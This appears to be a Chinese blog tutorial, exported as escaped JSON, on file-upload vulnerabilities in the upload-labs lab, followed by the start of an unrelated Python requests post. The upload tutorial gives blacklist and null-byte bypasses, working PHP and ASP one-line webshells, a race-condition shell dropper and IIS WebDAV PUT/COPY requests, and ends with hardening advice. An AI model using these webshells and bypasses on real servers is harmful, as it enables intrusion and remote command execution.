array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点 $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写 $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; &#x2F;&#x2F; 我们上传的文件没有进行随机化重命名，而是直接将对应文件名拼接到最终的路径下进行上传 $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &#39;此文件不允许上传&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; 3、修改文件名 绕过黑名单验证因为Windows特性不能再Windows下修改文件名为 12例如：file.php. . 需要在kali中修改 上传拼接文件，返回空白图片 选择图片的图片地址，在新的页面打开，因为我上传的php代码里面是phpinfo所以会返回phpinfo的内容 在查看upload下是否有file.php文件 这样的一个绕过，只适用于Windows系统，并且当前的文件名没有被重命名，而是直接使用用户上传的文件名，这时候用户文件名是一个可控状态 4、上传小WebShell(小马)，大WebShell(大马)上传WebShell，可以绕过上传过程中对文件大小等限制，从而能够更加有效上传大WebShell 在某些情况下，会对文件上传的大小做一些限制，为了突破这个限制，先上传小WebShell(小马)，也就是它本身就是一个可以上传WebShell的上传界面，而它的上传界面当中对应的代码对比相对的大WebShell(大马)，小很多。 通过缩减对应的字节数，从而达到符合对应的上传的限制，然后进行上传小WebShell，上传之后小WebShell是没有做限制的，这个时候就可以利用小WebShell上传更大的WebShell，从而突破文件上传工程中对文件大小的限制，以及其他限制 这是小马，代码量比较少 进行上传，返回空白图片，右键复制网页地址，在新的页面打开 打开网页地址，成功上传了小马 在进行上传大马，打开大马，复制其中内容Ctrl+A进行全部选取，Ctrl+C复制 复制到小马的上传文本框中，将之前的xiaoma.php改名为dama.php(起什么名字无所谓，只要不适合xiaomaphp相同就行)，点击create 注意：因为如果不改名的话就会将大马的内容上传到之前小马的php文件中 返回ok表示上传成功，这样就说明大马成功上传了 查看站点根目录，这样就有了dama.php 访问大马出现报错 因为之前小马中使用了utf-8的原因，我们将小马的编码删除，在按照以上的方式来上传一遍 绕过黑名单验证(双写绕过)upload-labs第十关 1、双写绕过原理代码编写过程中，支队黑名单中的内容进行空替换，因为只替换一次所造成的双写绕过 例如： 121.ph php p进行对应的空替换时，会首先发现php，将其过滤，过滤之后因为中间的php没有了，后面的p补上来，又变成了一个php文件，从而达到绕过。 2、基于黑名单验证代码分析str_ireplace()函数替换字符串中的一些字符(不区分大小写)。 该函数必须遵循下列规则 如果搜索的字符串是一个数组，那它将返回一个数组 如果搜索的字符串是一个数组，那么它将对数组中的每一个元素进行查找和替换 如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查询到的元素数量，那么多余的元素将用空字符进行替换 如果是对一个数组进行查找，但只是对一个字符串进行替换，那么替代字符串将对所有查找到的值起作用。 注释：该函数不区分大小写。请使用str_replace()函数来执行区分大小写的搜索。 注释：该函数是二进制安全的 12345678910111213141516if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); &#x2F;&#x2F; 这里使用str_ireplace()函数，这个函数的意思是，只替换一次，并且为空。 &#x2F;&#x2F; 将$file_name中符合$deny_ext黑名单中的后缀名替换为空 $file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name); if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name)) &#123; $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; .$file_name; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; 3、绕过黑名单验证将文件进行双写,例如：one.pphphp 选择文件进行上传，发现返回空白图片，复制图片地址 将复制的图像地址在菜刀或者蚁剑打开，成功上传 绕过白名单验证(00截断绕过)1、00截断原理0x00是十六进制表示方法，是ascii码为0的字符，在有些和函数处理时，会把这个字符当做结束符 系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束 在PHP5.3之后的版本中完全修复了00截断。并且00截断受限于GPC，addslashes函数 白名单验证就是指定的文件后缀名，比如只允许jpg、png等文件上传，进行文件上传时，只有后缀名符合这两个后缀名才允许上传，这就是白名单 %00字符截断的问题不只是在文件上传漏洞中有所利用，因为这是一个被广泛应用于字符串处理函数的保留字符，因此在各种不同的业务逻辑中都有可能出现问题，需要引起重视。而白名单在进行验证时可以直接在后面输入00 比如： 123再上传过程中它是一个jpg文件，但是在.php后面有0x00截断，.jpg忽略，这样就成功上传了1.php1.php0x00.jpg00后面的内容都将被忽略，但是在整个过程中，他的文件名还是依然存在 2、GET型00截断GET型提交的内容会被自动进行URL解码。 注意：进行00截断一定要关闭GPC，否则无法成功。 1234567891011121314151617181920if(isset($_POST[&#39;submit&#39;]))&#123; $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; &#x2F;&#x2F; date()随机数和rand()时间，以及最后添加文件扩展名$file_ext &#x2F;&#x2F; 这样就可以在date(&quot;YmdHis&quot;)后面加入0x00截断，使$file_ext被添加的文件后缀名不会被执行成功 $img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; &#x2F;&#x2F; 使用move_uploaded_file将临时上传的文件$temp_file保存到$img_path路径下，并且进行了随机化重命名 if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload &#x3D; true; &#125; else&#123; $msg &#x3D; &#39;上传失败！&#39;; &#125; &#125; else&#123; $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125;&#125; 首先新建一个1.php的文件，将其里面写入一句话木马 写入一句话木马后，在将文件改名为1.jpg或者png只要是允许上传的文件格式就可以 进行上传，使用burp抓包，然后将burp中的信息进行稍微修改 修改完成后运行包通过，页面会返回空白图片，右击点击图片地址。 在新的页面将地址粘贴，粘贴完不能直接执行，需要将红线处的内容删除，也就是1.php后的内容删除，否则报错 删除之后在进入页面，返回phpinof的页面 这就是GTE截断。 3、POST型00截断除了常见的检查文件名后缀的方法外，有的应用，还会通过判断上传文件的文件头来验证文件的类型。比如以下代码 在POST请求中，%00不会被自动解码，需要在16进制中进行修改00 1234567891011121314151617181920if(isset($_POST[&#39;submit&#39;]))&#123; $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; &#x2F;&#x2F; 这样就可以在date(&quot;YmdHis&quot;)后面加入0x00截断，使$file_ext被添加的文件后缀名不会被执行成功 $img_path &#x3D; $_POST[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; &#x2F;&#x2F; 使用move_uploaded_file将临时上传的文件$temp_file保存到$img_path路径下，并且进行了随机化重命名 if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload &#x3D; true; &#125; else&#123; $msg &#x3D; &quot;上传失败&quot;; &#125; &#125; else&#123; $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125;&#125; 创建一个php文件，写入一句话木马，然后更改为可上传格式，进行上传burp抓包 这里加入空格的原因是因为%00不会被自动解码，需要在16进制中修改，因为加入空格已知他是16进制的20，所以在HEX只需要找到位置将20修改为00就可以截断 为了绕过类似的MIME Sniff的功能，常见的攻击技巧是伪造一个合法的文件头，而将真实的PHP等脚本代码附在合法的文件头之后 在HEX子模块中找到1.php空格，找到20 找到20之后，要将他修改为00 修改执行点击forward进行上传，返回一个空白图片，右键复制图片连接 在新的浏览器打开，当然还是需要将php格式后面的删除，成功访问 注意：截断需要关闭GPC否则会上传失败 4、一句话代码执行Webshell使用php中的函数system执行GET提交的参数 12345678910&lt;?php &#x2F;&#x2F; 当参数不为空时，执行if下的语句 &#x2F;&#x2F; 当if判断输入为空时，执行else语句 if($_GET)&#123; $cmd&#x3D;$_GET[&quot;cmd&quot;]; system($cmd); &#125;else&#123; echo &quot;no cmd&quot;; &#125;?&gt; 因为我们并没有提交任何参数，所以返回为no cmd为空 如果写入cmd=ipconfig，会返回ipconfig的详细信息 如果上感觉太乱，可以查看源码，这样就会整齐的列下来 在某些时候JS会限制右键，可以使用 “view-source:URL” 来查看源代码 例如： 1view-source:http:&#x2F;&#x2F;127.0.0.1&#x2F;upload-labs&#x2F;upload&#x2F;web.php?cmd&#x3D;ipconfig 图片WebShell上传1、图片WebShell制作在服务端的PHP代码中，对于用户上传的文件做文件类型检查，查看文件格式是否符合上传规范。可以检查文件二进制格式的前几个字节，从而判断文件类型是否正确。 新建php文件将其写入代码 将PHP格式改为jpg格式 2、上传图片WebShell文件将制作好的图片WebShell上传到服务器。 其中可能Content-Type验证。修改为image/gif或者image/jpg 符合当前文件类型的MIME 进行上传然后使用Burp抓包，Forward进行放行 返回空白图片，复制图片地址，在新的页面打开 发现页面打开，但是并没有phpinfo的界面，说明出错了 因为文件我们直接编写的，他没有直接显示，这样的话他还是没有直接显示对应的phpinfo，对于这种情况就要使用对用的文件包含漏洞进行对应的测试，才能执行对应的phpinfo 3、文件包含漏洞代码分析在PHP中，使用include、require、include_once、require_once函数包含的文件都会被当做PHP代码执行，无论文件的名称是什么，只要符号文件内容符合PHP代码规范，都会被当作PHP代码执行 12345678&lt;?php if($_GET)&#123; include($_GET[&quot;file&quot;]); &#125; else&#123; echo &quot;not get args file&quot;; &#125;?&gt; 4、结合文件包含输出phpinfo将上面代码放在upload下，将地址复制打开，返回not get args file，说明代码没问题 在php后面加上?file=一句话木马的图片名称，将红线处的图片名称复制到蓝线处 利用存在文件包含的PHP页面，包含上传的图片WebShell，从而触发WebShell，输出对应的phpinfo 竞争条件upload-labs 17 1、文件上传过程介绍文件上传过程： 从浏览器上传到服务器，服务器接收到浏览器上传的文件时，服务器就会获取对应的文件，获取文件之后他不会立即将文件保存到对应的网站目录下，而是会将他保存到系统的临时文件当中，保存到临时文件之后，当我们在对应的脚本当中使用对应的重命名函数时，才会将临时文件移动到我们对应的上传目录下 例如：我们在php脚本语言当中使用move_uploade这个函数之后，才会将文件真实的上传到咱们对应的站点目录下。 2、竞争条件原理介绍网站逻辑： 1、网站允许上传任意文件，然后检查上传文件是否包含WebShell，如果包含删除该文件 2、网站允许上传任意文件，但是如果不是指定类型，那么使用unlink删除文件 问题： 在删除之前如果访问到上传的php文件或者其他脚本文件，从而执行上传中的php代码或者其他脚本代码 例如：上传文件代码 123456&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#39;);?&gt;假如以上代码命名为WebShell.php，那么再删除WebShell.php时，首先访问了WebShell.php，这时候就会在相应的WebShell.php当前目录下新建一个shell.php一句话脚本，从而可以使用菜刀进行连接通俗点说就是当你上传完WebShell.php文件，网站要检查你这个文件是不是包含了恶意脚本，检查的时候需要打开WebShell.php文件，当打开的时候就执行了php脚本，因为检查和删除是需要时间的，所以就在这个时间段内生成了一个shell.php脚本，将&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;这段代码放进了 shell.php中，这样就可以使用菜刀连接了 3、竞争条件代码分析先进行上传，然后进行判断与删除，利用时间差进行WebShell上传。 首先进行了对应的上传，上传之后才进行判断，判断上传的文件是否符合对应的条件，符合类型为jpg，png，gif，如果符合使用rename()函数进行重命名，如果不符合使用unlink()函数进行删除，这个时候就可以利用判断和删除的时间差来进行对应的webshell上传，从而访问到上传的php脚本 因为在move_uoloaded_file(){函数后面那里并没有进行判断，这个时候就可因进行上传比如一个1.php，网站在删除之前访问到1.php，那么1.php脚本当中内容就会执行 4、竞争条件文件上传利用提前不断访问代码文件，然后上传，最终使用才到连接一句话webshell Python发送http请求： 123import requestswhile true: requests.get(&quot;路径&quot;) 使用单一测试速度达不到，无法在删除之前进行对应的访问，为了达成实验目的，在删除之前加一个sleep进行延迟，时间延迟5秒 先查看upload，发现upload下没有任何文件 先执行text.py，使用python脚本进行不断地发送http请求，连接webshell.php 在kali中进行对应的上传 wireshark下查看可以看到不断地请求webshell.php 查看webshell.php中的代码，写入的shell.php和一句话木马 页面选择webshell.php进行提交 可以查看upload文件下，发现shell.php成功上传 打开shell.php查看内容，这是一句话木马 上传一句话木马后可以使用菜刀进行连接 中间件解析漏洞 - IIS6.0IIS文件解析问题IIS 6在处理文件解析时，也出过一些漏洞。前面提到的0X00字符截断文件名，在IIS和Windows环境下出过类似的漏洞，不过截断字符变成了” ; “ 当文件名为123.asp;111.jpg时，IIS 6会将文件解析为abc.asp，文件名被阶段了，从而导致脚本被执行。比如： 1http:&#x2F;&#x2F;192.168.127.25&#x2F;123.asp;111.jpg 会执行123.asp，而不会管111.jpg 1、IIS6.0解析漏洞介绍解析漏洞描述： 解析漏洞就是上传到web服务器上的这个文件并不是.asp命名的这样一个文件，会被服务器IIS6.0这个服务器解析为asp文件，这时候就造成了非.asp后缀名的文件，被当做asp脚本执行，从而执行其中的代码 注意：这两个IIS漏洞，是需要在服务器的本地硬盘上确实存在这样的文件或者文件夹，若只是通过Web应用映射出来的URL，则是无法触发的1）当监理*.asp格式的文件夹时，其目录下的任意文件讲被IIS当作asp文件解析。 1&lt;%&#x3D;anoe()%&gt; 在Windows sever2000当中进行测试，新建了一个站点 打开浏览器进行访问，可以正常打开 在站点的根目录新建一个文件夹1.asp 下面进行访问，访问1.asp下的1.txt文本，发现并没有输入NOW而是将文本变成了asp执行 2）当文件*.asp;1.jpg IIS6.0同样会将文件作为asp文件解析 在根目录下新建一个a.asp;1.txt 在文本中写入 &lt;%NOW()%&gt; asp内容 进行访问这个网址a.asp;1.txt，页面也没有返回NOW而是返回了当前时间 2、IIS6.0 PUT上传原理WebDAV基于HTTP1.1协议的通信协议使得HTTP支持PUT MOVE COPY DELETE等功能，它所包含的PUT方法，允许用户上传文件到指定路径下。 在许多Web Sever 中，默认都禁用了此方法，或者对能够上传的文件类型做了严格限制。但在IIS中，如果目录支持写权限，同时开启了WebDav，则会支持PUT方法，再结合MOVE方法，就能够将原本只允许上传文本文件改写为脚本文件，从而执行WebShell。MOVE能否执行成功取决于IIS服务器是否勾选了”脚本资源访问”复选框 如果要实施这个攻击过程，攻击者应先通过OPTIONS方法探测服务器支持的HTTP方法类型，如果支持PUT，则使用PUT上传一个指定的文本文件，最后再通过MOVE改写脚本文件 ​ 1、探测是否存在IIS PUT 漏洞： 1234&#x2F;&#x2F; 如果探测过程中出现了对应支持的这些方法，那就说明存在IIS PUT漏洞&#x2F;&#x2F; 当然也有很多中间件支持PUTOPTIONS&#x2F;HTTP1.1Host:www.xxx.com ​ 2、上传txt文本文件 123456&#x2F;&#x2F; 如果上面探测出PUT方法，就可以使用PUT然后设置对应的上传位置，将他传到根目录下的a.txtPUT &#x2F;a.txt HTTP1.1Host：www.xxx.comContent-Length：30 &lt;%eval reques(&quot;chopper&quot;)%&gt; ​ 3、通过Move或Copy重名 12345&#x2F;&#x2F; 上传之后是上传了一个txt文本文档，这时候就需要copy将其拷贝到其他位置&#x2F;&#x2F; 比如将a.txt拷贝到cmd.asp,这时候txt文件就会被重命名为cmd.aspCOPY&#x2F;a.txt HTTP1.1 HOST：www.xxx.comDestination：http:&#x2F;&#x2F;www.xxx.com&#x2F;cmd.asp ​ 4、删除 123&#x2F;&#x2F; 为了防止多余的txt文档被系统管理员看到，这个时候就是用delete来删除根目录下的a.txtDELETE&#x2F;a.txt HTTP1.1Host:www.xxx.com 3、IIS6.0 PUT上传探测可以使用OPTIONS探测，也可以使用自动化工具探测 自动化工具探测 使用nikto探测 1-nikto -h IP地址 例如： 因为支持这几个方法所以可以确定存在IIS漏洞 4、IIS6.0 PUT上传利用以下内容中的asp写错了多加了一个括号和@符号正确格式 1&lt;% eval request(&quot;cmd&quot;)%&gt; 利用burpsuite进行IIS PUT漏洞利用。先OPTIONS探测、PUT、MOVE、DELETE 截断对应数据包，修改对应的方法OPTIONS进行探测，如果返回了200，并且返回了对应的支持方法，这个时候可以判断他是支持IIS PUT 探测完就要上传一个文本 在红线处将OPTIONS改为PUT/123.txt，在紫色下划线地方写入asp脚本 1&lt;%@eval request(&quot;cmd&quot;))%&gt; 修改为配置点击GO，这样根目录下就会多一个123.txt文本，也可以在右面response中看到HTTP相应是201也就是创建 在根目录查看是否有一个123.txt，如果有查看123.txt中的内容 发现确实凡在，并且内容也是asp脚本内容 上传完成之后就需要进行MOVE重命名或者COPY拷贝 打开网址输入网址的URL进行抓包，将其配置信息修改 将GET修改为COPY，拷贝的内容是123.txt，可以将Host以下的内容全部删除 写入Destination：URL 1Destination：http:&#x2F;&#x2F;192.168.1.110&#x2F;123.asp;aaa.jpg 点击GO进行执行，返回HTTP201表示完成 查看根目录下是否有这个文件，发现文件确实存在，说明执行成功 当然也可以改为其他名称，但要符合解析漏洞的内容 以上代码存在错误，已在开头表明，这里已经修改完成使用菜刀进行连接，成功连接 Apache文件解析漏洞1、Apache环境搭建Apache和PHP采用module的方式结合 只有Apache和php采用moudule的方式来进行结合时才有解析漏洞，虽然可以和其他的结合但是不存在解析漏洞 这样就需要下载单独的Apache和PHP，在Apache下hettpd.conf文件，将对应的PHP文件加载进来 安装完Apache后在文件夹下的conf中的httpd.conf进行配置 加载对应的模块LoadModule php5_module “路径”将文件中在带的dll进行加载 设置PHP初始化目录PHPIniDir “目录” 以及对一些文件进行解析AddType application/x-httpd-php .php .html .htm，加上这些后缀名是只对这些后缀名进行解析 如果使用这种情况，会出现错误的 2、Apache解析漏洞介绍因为Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名也可以拥有多个扩展名。Apache认为应该从右到左开始判断解析方法的。如果最右侧的扩展名不可识别的，就继续往左判断，直到判断到文件名为止 官方解释：http://httpd.apache.org/docs/current/mod/directive-dict.html 比如：1.php.xxxx 这个文件有两个文件后缀名，一个是php一个是xxxx，当Apache从右向左进行解析时，先解析后缀名.xxxx发现不然是继续向左解析，解析到.php，Apache认识就会当做PHP解析 注意：Apache本身是不能解析php文件，而是调用php模块来解析php文件，Apache只是判断这个文件是不是php如果是就交给php模块解析，Apache本身不具有解析功能，只是判断文件类型。3、解析漏洞利用演示在站点目录下新建一个1.php.xxxx文件，xxxx文件后缀名为无法识别的后缀名。其中内容为phpinfo(); 在Apache下的htdocs下新建一个1.php .xxxx 打开cmd使用ipconfig获取ip地址 在浏览器当中进行访问，这样就会输出对应的phpinfo，由此可以确定这个文件会被Apache当做php文件格式，并传递给php.exe进行执行 传递到这里，进行执行 4、利用场景介绍在Web程序总存在文件上传，但是有黑名单验证时，利用该解析漏洞可以上传对应各WebShell到目标服务器 比如： 传递一句话木马，使用菜刀连接 123&lt;?php @vale($_POST[&#39;cmd&#39;]);?&gt; 例如使用1.php.xxxx的文件内容修改为一句话木马，然后使用中国菜刀进行连接，连接时同样是这个文件，但是会被Apache当做php来进行判断，判断它为php文件，这时候就会调用php.exe进行解析，然后就成功连接到中国菜刀的一句话WebShell 文件上传修复建议 通过白名单的方式判断文件后缀名是否合法 对上传的文件名进行重命名。 例如： rand(10,99).date(&quot;YmdHis&quot;).&quot;.jpg&quot;。 设计安全的文件上传功能1、文件上传的目录设置为不可执行只要web容器无法解析该目录下的内容，即使攻击者上传了脚本文件，服务器本身也不会收到影响，因此此点至关重要。在实际应用中，很多大型网站的上传应用，文件上传后会放到独立的存储上做静态文件处理，一方面方便使用缓存加速，降低性能损耗；另一方面也杜绝了脚本执行的可能。 2、判断文件类型在判断文件类型时，可以结合使用MIME Type、后缀名检查等方法。在文件类型检查中，强烈推荐使用白名单，黑名单的方式不可靠。对于图片的处理，可以使用压缩函数resize()函数，在处理图片的同时破坏图片中可能包含的HTML代码。 3、使用随机数该写文件名和文件路径文件上传如果要执行代码，则需要用户能够访问到这个文件，在某些环境中，用户能上传，但不能访问，如果应用使用随机数改写了文件的路径，将极大地增加了攻击的成本。与此同时，像shell.php.rar.rar这种文件，或者是crossdomain.xml这种文件，都将因为文件名被改写而无法成功实施攻击 4、单独设置文件服务器的域名由于浏览器同资源策略的关系，一系列客户端攻击将失效，比如上传rossdomain.xml、上传包含JavaScript的XSS利用等问题将得到解决 当然这只是简单的文件上传预防，如果还要考虑病毒、木马、色情图片与视频，反政治文件等等，需要做的就非常多了，文件上传看似简单，但要实现一个安全的上传功能是非常不容易的","categories":[],"tags":[]},{"title":"python爬虫","slug":"python爬虫","date":"2020-04-03T06:36:06.840Z","updated":"2020-04-03T09:16:15.826Z","comments":true,"path":"2020/04/03/python爬虫/","link":"","permalink":"https://zhanqiaozai.github.io/2020/04/03/python%E7%88%AC%E8%99%AB/","excerpt":"","text":"Response响应状态200代表成功、301表示跳转、404找不到页面、502服务器错误 响应头如内容类型、内容长度、服务器信息、设置Cookie等 响应体主要部分，包含了请求资源的内容、如网页HTML、图片二进制数据等 我们在做爬虫时可以用一些HTTP请求库，然后向服务器发送一个请求，得到这个Response,然后把这个响应体里面的内容拿下来，这个实际上就是网页的源代码，然后我们再把这个网页的源代码，进行解析，就可以拿到我们的数据了，模拟请求 123456789101112131415161718192021222324252627282930313233&gt;&gt;&gt; import requests#调用requests.get方法传入百度这个网址，这个也就是HTTP请求的发送，拿到这个响应#也就是说，requests库提供了get方法，我们传入这个URL也就是百度网址，就可以向服务器发送一个请求，然后拿到这个response&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.baidu.com&#39;)#打印response.text然后这个text就是把网页的源代码，也就是响应体拿过来&gt;&gt;&gt; print(response.text)#成功的获取到了这些网页的源代码，接下来就可以对网页进行解析了&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt; &lt;head&gt;&lt;meta http-equiv&#x3D;content-type content&#x3D;text&#x2F;html;charset&#x3D;utf-8&gt;&lt;meta http-equiv&#x3D;X-UA-Compatible content&#x3D;IE&#x3D;Edge&gt;&lt;meta content&#x3D;always name&#x3D;referrer&gt;&lt;link rel&#x3D;stylesheet type&#x3D;text&#x2F;css href&#x3D;http:&#x2F;&#x2F;s1.bdstatic.com&#x2F;r&#x2F;www&#x2F;cache&#x2F;bdorz&#x2F;baidu.min.css&gt;&lt;title&gt;ç¾åº¦ä¸ä¸ï¼ä½ å°±ç¥é&lt;&#x2F;title&gt;&lt;&#x2F;head&gt; &lt;body link&#x3D;#0000cc&gt; &lt;div id&#x3D;wrapper&gt; &lt;div id&#x3D;head&gt; &lt;div class&#x3D;head_wrapper&gt; &lt;div class&#x3D;s_form&gt; &lt;div class&#x3D;s_form_wrapper&gt; &lt;div id&#x3D;lg&gt; &lt;img hidefocus&#x3D;true src&#x3D;&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png width&#x3D;270 height&#x3D;129&gt; &lt;&#x2F;div&gt; &lt;form id&#x3D;form name&#x3D;f action&#x3D;&#x2F;&#x2F;www.baidu.com&#x2F;s class&#x3D;fm&gt; &lt;input type&#x3D;hidden name&#x3D;bdorz_come value&#x3D;1&gt; &lt;input type&#x3D;hidden name&#x3D;ie value&#x3D;utf-8&gt; &lt;input type&#x3D;hidden name&#x3D;f value&#x3D;8&gt; &lt;input type&#x3D;hidden name&#x3D;rsv_bp value&#x3D;1&gt; &lt;input type&#x3D;hidden name&#x3D;rsv_idx value&#x3D;1&gt; &lt;input type&#x3D;hidden name&#x3D;tn value&#x3D;baidu&gt;&lt;span class&#x3D;&quot;bg s_ipt_wr&quot;&gt;&lt;input id&#x3D;kw name&#x3D;wd class&#x3D;s_ipt value maxlength&#x3D;255 autocomplete&#x3D;off autofocus&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;bg s_btn_wr&quot;&gt;&lt;input type&#x3D;submit id&#x3D;su value&#x3D;ç¾åº¦ä¸ä¸ class&#x3D;&quot;bg s_btn&quot;&gt;&lt;&#x2F;span&gt; &lt;&#x2F;form&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;div id&#x3D;u1&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;news.baidu.com name&#x3D;tj_trnews class&#x3D;mnav&gt;æ°é»&lt;&#x2F;a&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;www.hao123.com name&#x3D;tj_trhao123 class&#x3D;mnav&gt;hao123&lt;&#x2F;a&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;map.baidu.com name&#x3D;tj_trmap class&#x3D;mnav&gt;å°å¾&lt;&#x2F;a&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;v.baidu.com name&#x3D;tj_trvideo class&#x3D;mnav&gt;è§é¢&lt;&#x2F;a&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;tieba.baidu.com name&#x3D;tj_trtieba class&#x3D;mnav&gt;è´´å§&lt;&#x2F;a&gt; &lt;noscript&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;www.baidu.com&#x2F;bdorz&#x2F;login.gif?login&amp;tpl&#x3D;mn&amp;u&#x3D;http%3A%2F%2Fwww.baidu.com%2f%3fbdorz_come%3d1 name&#x3D;tj_login class&#x3D;lb&gt;ç»å½&lt;&#x2F;a&gt; &lt;&#x2F;noscript&gt; &lt;script&gt;document.write(&#39;&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&#x2F;bdorz&#x2F;login.gif?login&amp;tpl&#x3D;mn&amp;u&#x3D;&#39;+ encodeURIComponent(window.location.href+ (window.location.search &#x3D;&#x3D;&#x3D; &quot;&quot; ? &quot;?&quot; : &quot;&amp;&quot;)+ &quot;bdorz_come&#x3D;1&quot;)+ &#39;&quot; name&#x3D;&quot;tj_login&quot; class&#x3D;&quot;lb&quot;&gt;ç»å½&lt;&#x2F;a&gt;&#39;);&lt;&#x2F;script&gt; &lt;a href&#x3D;&#x2F;&#x2F;www.baidu.com&#x2F;more&#x2F; name&#x3D;tj_briicon class&#x3D;bri style&#x3D;&quot;display: block;&quot;&gt;æ´å¤äº§å&lt;&#x2F;a&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;div id&#x3D;ftCon&gt; &lt;div id&#x3D;ftConw&gt; &lt;p id&#x3D;lh&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;home.baidu.com&gt;å³äºç¾åº¦&lt;&#x2F;a&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;ir.baidu.com&gt;About Baidu&lt;&#x2F;a&gt; &lt;&#x2F;p&gt; &lt;p id&#x3D;cp&gt;&amp;copy;2017&amp;nbsp;Baidu&amp;nbsp;&lt;a 